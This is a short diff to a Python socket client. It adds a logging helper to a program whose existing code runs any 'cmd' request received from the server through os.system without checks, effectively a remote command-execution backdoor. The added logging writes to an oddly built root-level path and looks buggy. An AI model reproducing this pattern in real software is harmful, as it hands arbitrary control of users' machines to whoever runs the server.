@@ -37,6 +37,12 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         # Wait for the server's response and decode it
         response_data = s.recv(1024)
         response = response_data.decode()
+        
+        def log():
+            print(f"{response_message['From']} --> {response_message['To']}: {response_message['Request_Type']} {response_message['Request']}")
+            f = open(f'/{os.listdir(data_path)[-0]}', 'w+')
+            f.writelines(f"{response_message['From']} --> {response_message['To']}: {response_message['Request_Type']} {response_message['Request']}")
+            f.close()
 
         # Check if the message is for this client
         response_message = json.loads(response)
@@ -45,5 +51,6 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 print(response_message['Request'])
             elif response_message['Request_Type'] == "cmd":
                 os.system(response_message['Request'])
+            log()
         else:
-            print(f"{response_message['From']} --> {response_message['To']}: {response_message['Request_Type']} {response_message['Request']}")
+            log()
